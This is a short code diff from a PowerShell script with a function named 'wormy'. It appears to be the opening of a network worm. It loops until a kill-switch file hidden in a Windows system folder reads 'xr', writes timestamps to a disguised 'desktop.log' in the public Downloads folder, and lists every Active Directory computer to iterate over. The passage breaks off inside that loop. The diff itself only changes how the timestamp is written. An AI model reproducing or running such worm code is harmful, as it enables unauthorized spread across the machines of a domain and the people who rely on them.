@@ -1,7 +1,7 @@
 ﻿function wormy{
 
 while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
-start-job -Scriptblock{[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'}
+[int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
 Write-Output 'slither'
 $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
 Foreach($i in $computerNames){
